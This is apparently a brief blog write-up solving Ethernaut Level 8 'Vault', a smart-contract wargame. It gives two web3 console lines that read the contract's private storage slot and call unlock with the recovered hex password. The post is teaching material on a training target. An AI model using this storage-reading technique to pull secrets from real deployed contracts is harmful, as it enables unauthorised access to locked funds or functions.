+++
title = 'Ethernaut Level 8 - Vault'
date = 2024-08-04
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Nothing is hidden on the blockchain'
tags = [ 'writeups' , 'blockchain' ]
+++
> Nothing is hidden on the blockchain
https://medium.com/coinmonks/smart-contract-exploits-part-1-featuring-capture-the-ether-lotteries-8a061ad491b


```js
// Leak 32 bytes at offset 1
await web3.eth.getStorageAt(contract.address, 1)
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29") 
```

